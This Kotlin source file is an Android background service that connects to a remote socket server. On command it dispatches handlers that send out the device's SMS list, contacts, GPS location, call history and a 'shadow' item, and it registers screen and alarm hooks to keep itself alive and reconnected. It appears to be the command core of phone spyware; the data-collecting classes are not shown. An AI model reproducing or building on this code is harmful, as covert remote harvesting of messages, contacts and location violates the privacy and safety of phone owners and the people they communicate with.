package com.hc.calling

import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.os.Binder
import android.os.IBinder
import com.hc.calling.commands.Executor
import com.hc.calling.commands.callingtransaction.Call
import com.hc.calling.commands.contact.Contacts
import com.hc.calling.commands.dingding.DingTalk
import com.hc.calling.commands.gps.GPS
import com.hc.calling.commands.shadow.Shadow
import com.hc.calling.commands.sms.Sms
import com.hc.calling.keeper.KeepLiveReceiver
import com.hc.calling.socket.SocketConductor

/**
 * Created by ChanHong on 2019/3/18
 *
 */
class MainService : Service() {
    private val executors = mutableMapOf<String, Executor>()

    override fun onCreate() {
        super.onCreate()
        executors[Sms.SEND_SMS_LIST] = Sms(context = this)
        executors[Contacts.SEND_CONTACTS_LIST] = Contacts(context = this)
        executors[GPS.SEND_GPS] = GPS(context = this)
        executors[Call.SEND_CALLING_HISTORY] = Call(context = this)
        executors[Shadow.SEND_SHADOW] = Shadow(context = this)
        SocketConductor
            .instance
            .connect2Server(context = this)
            .apply {
                executors.forEach { map ->
                    this.on(map.key) {
                        map.value.execute(it)
                    }
                }
            }

    }

    override fun onBind(intent: Intent?): IBinder {
        return MyService()
    }

    /**
     *    connect to the socket server
     */
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        KeepLiveReceiver().apply {
            this@MainService.registerReceiver(this, IntentFilter(Intent.ACTION_SCREEN_ON))
            this@MainService.registerReceiver(this, IntentFilter(Intent.ACTION_SCREEN_OFF))
        }
//        this@MainService.registerReceiver(DingTalk.AlarmReciver(), IntentFilter("ding talk"))

        if (!SocketConductor.instance.socket!!.connected()) {
            SocketConductor.instance.socket!!.connect()
        }

        DingTalk.initAlarmManager(this)
        return super.onStartCommand(intent, flags, startId)
    }

    inner class MyService : Binder()

    override fun onDestroy() {
        super.onDestroy()
        SocketConductor.instance.socket!!.close()
    }

}